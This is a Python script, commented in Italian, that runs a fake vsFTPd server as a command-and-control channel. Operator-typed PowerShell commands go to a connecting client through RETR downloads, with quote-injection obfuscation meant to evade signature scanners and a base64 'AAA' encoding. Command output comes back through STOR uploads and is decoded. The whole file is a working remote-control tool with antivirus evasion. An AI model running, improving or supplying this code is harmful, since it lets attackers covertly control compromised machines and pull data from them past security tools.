import socket
import base64
import random
import re

# ============================================================
#  CREDENZIALI - modificare qui username e password
# ============================================================
FTP_USER = "usrftp"
FTP_PASS = "myPassword"
DEBUG = False   # False = niente output di debug

CONTROL_PORT      = 21
PASSIVE_DATA_PORT = 10092   # porta fissa per il canale dati passivo
# ============================================================

def debug_print(*args, **kwargs):
    if DEBUG:
        print(*args, **kwargs)

def send(sock: socket.socket, msg: str) -> None:
    sock.sendall((msg + "\r\n").encode())
    debug_print(f"[S->C] {msg}")


def recv_line(sock: socket.socket) -> str:
    buf = b""
    while True:
        ch = sock.recv(1)
        if not ch:
            break
        buf += ch
        if buf.endswith(b"\n"):
            break
    line = buf.decode(errors="replace").strip()
    if line:
        debug_print(f"[C->S] {line}")
    return line


def _insert_junk_between_chars(word: str) -> str:
    """
    Method 1 — Quote injection.
    Inserts '' between letters of a PowerShell keyword so that the shell
    still executes the command while confusing signature scanners.

    Constraints:
      - At most ONE separator is placed between any two adjacent characters
        (prevents generating who''''ami).
      - Between 1 and (len-1) positions are selected at random.

    BUG FIX — only '' (single-quote pairs), never "" (double-quote pairs):
    If "" were injected inside a keyword (e.g. St""art-Process), Pass 3 would
    later misinterpret those double quotes as string delimiters and corrupt the
    token into something like St""("art-P""roc")...  Using only '' avoids this
    entirely because Pass 3 exclusively scans for double-quote delimited strings.
    """
    if len(word) <= 1:
        return word

    # FIX: single-quote pairs only — never double-quote pairs.
    separators = ["''"]
    chars = list(word)
    max_insertions = len(chars) - 1
    n_insertions = random.randint(1, max_insertions)

    gap_indices = list(range(max_insertions))
    insert_positions = set(random.sample(gap_indices, n_insertions))

    result = [chars[0]]
    for i in range(len(chars) - 1):
        if i in insert_positions:
            result.append(random.choice(separators))
        result.append(chars[i + 1])

    return "".join(result)


def process_payload(payload_input):
    """
    Estrae il primo comando dal payload, lo passa alla funzione
    _insert_junk_between_chars e ricostruisce la stringa.
    """

    # il comando deve iniziare con una lettera
    pattern = r'^(\(*)\s*([A-Za-z][A-Za-z0-9_-]*)'

    match = re.match(pattern, payload_input)
    if not match:
        return payload_input

    command = match.group(2)

    # elabora il comando
    obfuscated = _insert_junk_between_chars(command)

    # ricostruisce la stringa originale
    start = match.start(2)
    end = match.end(2)

    return payload_input[:start] + obfuscated + payload_input[end:]


def open_passive_server() -> socket.socket:
    """Apre il socket in ascolto sulla porta dati."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", PASSIVE_DATA_PORT))
    srv.listen(1)
    print(f"[SERVER] Porta dati {PASSIVE_DATA_PORT} in ascolto.")
    return srv


def handle_client_full(ctrl_sock: socket.socket) -> None:
    send(ctrl_sock, "220 (vsFTPd 3.0.5)")

    # ── FASE 1: autenticazione ──────────────────────────────
    line = recv_line(ctrl_sock)
    if not line.upper().startswith("USER"):
        send(ctrl_sock, "500 Syntax error.")
        ctrl_sock.close()
        return
    username = line[5:].strip() if len(line) > 5 else ""

    send(ctrl_sock, "331 Please specify the password.")

    line = recv_line(ctrl_sock)
    if not line.upper().startswith("PASS"):
        send(ctrl_sock, "500 Syntax error.")
        ctrl_sock.close()
        return
    password = line[5:].strip() if len(line) > 5 else ""

    # ── FASE 2: verifica credenziali ────────────────────────
    if username != FTP_USER or password != FTP_PASS:
        send(ctrl_sock, "530 Login incorrect.")
        ctrl_sock.close()
        print("[SERVER] Autenticazione fallita. Connessione chiusa.")
        return

    send(ctrl_sock, "230 Login successful.")
    print("[SERVER] Autenticazione OK.")

    # TYPE I
    line = recv_line(ctrl_sock)
    if line.upper().startswith("TYPE"):
        send(ctrl_sock, "200 Switching to Binary mode.")

    # ── LOOP FASE 4 / FASE 5 ────────────────────────────────
    while True:

        # ────────────────────────────────────────────────────
        # FASE 3+4: EPSV / SIZE / RETR / dati / 226
        #
        # Sequenza corretta per evitare deadlock con un client
        # sincrono (send-wait-send-wait):
        #
        #   Client invia:  EPSV  --> server risponde: 229
        #   Client invia:  SIZE  --> server risponde: 213 (fittizio, subito)
        #   Client invia:  RETR  --> server chiede input utente, poi 150
        #   Client apre canale dati, legge payload
        #   Server invia dati, chiude canale dati
        #   Server invia: 226
        #
        # Il 213 viene risposto SUBITO con dimensione 0 (il client
        # non usa il valore per nulla di critico in questa simulazione).
        # Questo sblocca il client che invia RETR; solo allora il
        # server chiede il payload all'utente.
        # ────────────────────────────────────────────────────

        line = recv_line(ctrl_sock)
        if not line.upper().startswith("EPSV"):
            print(f"[SERVER] Atteso EPSV, ricevuto: '{line}'")
            send(ctrl_sock, "500 Syntax error.")
            break

        # Apri porta dati PRIMA di rispondere al 229
        data_srv_retr = open_passive_server()
        send(ctrl_sock, f"229 Entering Extended Passive Mode (|||{PASSIVE_DATA_PORT}|)")

        # Leggi SIZE e rispondi SUBITO con 213 (dimensione fittizia)
        # per sbloccare il client che aspetta questa risposta prima di inviare RETR
        line = recv_line(ctrl_sock)
        if not line.upper().startswith("SIZE"):
            print(f"[SERVER] Atteso SIZE, ricevuto: '{line}'")
            data_srv_retr.close()
            send(ctrl_sock, "500 Syntax error.")
            break
        filename = line[5:].strip()
        send(ctrl_sock, "213 0")  # risposta immediata: sblocca il client

        # Ora leggi RETR (il client lo invia subito dopo aver ricevuto 213)
        line = recv_line(ctrl_sock)
        if not line.upper().startswith("RETR"):
            print(f"[SERVER] Atteso RETR, ricevuto: '{line}'")
            data_srv_retr.close()
            send(ctrl_sock, "500 Syntax error.")
            break

        # Solo ora chiedi il payload: il canale di controllo e libero,
        # nessun comando pendente dal client
        print(f"\n[SERVER] Il client vuole scaricare: {filename}")
        payload_input = input("[SERVER] Scrivi il payload (o QUIT per terminare): ").strip()
        quit_mode = payload_input.upper() == "QUIT"
        # offuscamento comando
        if quit_mode:
           payload_input_quote=payload_input
        else:
           payload_input_quote = process_payload(payload_input)
        print(f"\ncomando che sto per inviare: {payload_input_quote}")

        # >>>>>>>>>>>>>>>>>>>        
        # >>>>>>>>>>>>>>>>>>> DATI DA INVIARE CODIFICO: Codifico stringa da passare 
        # >>>>>>>>>>>>>>>>>>>          
        # 1. converti la stringa in bytes (UTF-8)
        payload_bytes = payload_input_quote.encode("utf-8")
        # 2. codifica in Base64
        payload_b64 = base64.b64encode(payload_bytes)
        # 3. aggiungi il prefisso AAA e converti di nuovo in stringa
        payload_input = "AAA" + payload_b64.decode("utf-8")
        # payload_input ora contiene AAA + Base64 della stringa originale
        print(payload_input)
        payload_bytes = payload_input.encode()

        send(ctrl_sock, f"150 Opening BINARY mode data connection for {filename} ({len(payload_bytes)} bytes).")
        data_conn, addr = data_srv_retr.accept()
        print(f"[SERVER] Connessione dati (RETR) da {addr}")
        data_conn.sendall(payload_bytes)
        data_conn.close()
        data_srv_retr.close()
        send(ctrl_sock, "226 Transfer complete.")

        if quit_mode:
            print("[SERVER] QUIT inviato. Chiusura.")
            break

        # ────────────────────────────────────────────────────
        # FASE 5: EPSV / STOR / ricevi dati / 226
        # ────────────────────────────────────────────────────

        line = recv_line(ctrl_sock)
        if not line.upper().startswith("EPSV"):
            print(f"[SERVER] Atteso EPSV (upload), ricevuto: '{line}'")
            send(ctrl_sock, "500 Syntax error.")
            break

        # Apri porta dati PRIMA di rispondere al 229
        data_srv_stor = open_passive_server()
        send(ctrl_sock, f"229 Entering Extended Passive Mode (|||{PASSIVE_DATA_PORT}|)")

        line = recv_line(ctrl_sock)
        if not line.upper().startswith("STOR"):
            print(f"[SERVER] Atteso STOR, ricevuto: '{line}'")
            data_srv_stor.close()
            send(ctrl_sock, "500 Syntax error.")
            break
        upload_filename = line[5:].strip()

        send(ctrl_sock, "150 Ok to send data.")
        data_conn, addr = data_srv_stor.accept()
        print(f"[SERVER] Connessione dati (STOR) da {addr}")
        received = b""
        while True:
            chunk = data_conn.recv(4096)
            if not chunk:
                break
            received += chunk
        data_conn.close()
        data_srv_stor.close()
        send(ctrl_sock, "226 Transfer complete.")

        # >>>>>>>>>>>>>>>>>>>        
        # >>>>>>>>>>>>>>>>>>> DATI RICEVUTI DECODIFICA: rimuove prefisso AAA (bytes)
        # >>>>>>>>>>>>>>>>>>>        
        if received.startswith(b"AAA"):
            received = received[3:]
        # rimuove spazi o newline (bytes)
        received = received.replace(b"\n", b"").replace(b"\r", b"").strip()
        # aggiusta padding Base64
        missing_padding = len(received) % 4
        if missing_padding:
            received += b"=" * (4 - missing_padding)
        # decodifica Base64 → bytes
        decoded_bytes = base64.b64decode(received)
        # opzionale: converti in stringa UTF-8
        received_text = decoded_bytes.decode("utf-8", errors="ignore")

        print(f"\n[SERVER] Contenuto file ricevuto ({upload_filename}):")
        print("=" * 40)
        print(received_text)
        print("=" * 40)

    ctrl_sock.close()
    print("[SERVER] Connessione chiusa. Server terminato.")


def main():
    print(f"[SERVER] Credenziali: user='{FTP_USER}'  pass='{FTP_PASS}'")
    print(f"[SERVER] In ascolto sulla porta {CONTROL_PORT} ...")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", CONTROL_PORT))
    srv.listen(1)

    ctrl_sock, addr = srv.accept()
    print(f"[SERVER] Client connesso da {addr}")
    srv.close()

    handle_client_full(ctrl_sock)
    print("[SERVER] Terminato.")


if __name__ == "__main__":
    main()
